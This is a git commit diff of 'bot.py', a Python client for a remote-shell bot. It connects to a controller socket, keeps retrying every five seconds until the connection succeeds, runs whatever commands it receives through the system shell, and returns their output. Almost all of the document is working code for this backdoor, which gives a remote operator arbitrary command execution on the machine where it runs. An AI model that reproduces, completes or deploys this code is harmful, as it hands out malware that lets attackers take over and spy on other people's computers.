03c54a10a31bbbff8017513e8ca6c4570d5e9adf
eBind Group <45529919+eBind@users.noreply.github.com>
2019-11-29 18:03:54 +0700

    Add files via upload

--- bot.py
+++ bot.py
@@ -1,12 +1,12 @@
 import socket
 import sys, os, io
 import ctypes
+import time
 import subprocess as sp
 
-server = ('127.0.0.1', 11719) # IP и порт тот же, что и в серверной части
+server = ('127.0.0.1', 11719) 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Функция будет выполнять команду в терминале/cmd.exe и возращать результат
 def run_command(command):
     encoding = os.device_encoding(1) or ctypes.windll.kernel32.GetOEMCP()
     out = sp.Popen(command, stdout=sp.PIPE, shell=True)
@@ -14,20 +14,38 @@ def run_command(command):
 
     return result.read()
 
-sock.connect(server) # Коннект к серверу
+# Function connect to server
+def connect():
+    try:
+        sock.connect(server)
+        return True
+    except:
+        return False
+
+# Connecting to server
+def while_connect():
+    connecting = True
+
+    while connecting:
+        if connect():
+            connecting = False
+        else:
+            time.sleep(5)
+
+while_connect()
 
 # Data exchange
 while True:
     try:
-        command = sock.recv(4096).decode() # Получаем сообщение, которое отправил сервер
+        command = sock.recv(4096).decode() 
 
         if command == "exit":
             break
 
         else:
-            result = run_command(command) # Выполняем команду
+            result = run_command(command)
             length = str(len(result)).zfill(16)
-            sock.send((length + result).encode()) # Отправка результат
+            sock.send((length + result).encode()) 
     except:
         try:
             sock.send("\nexcept")
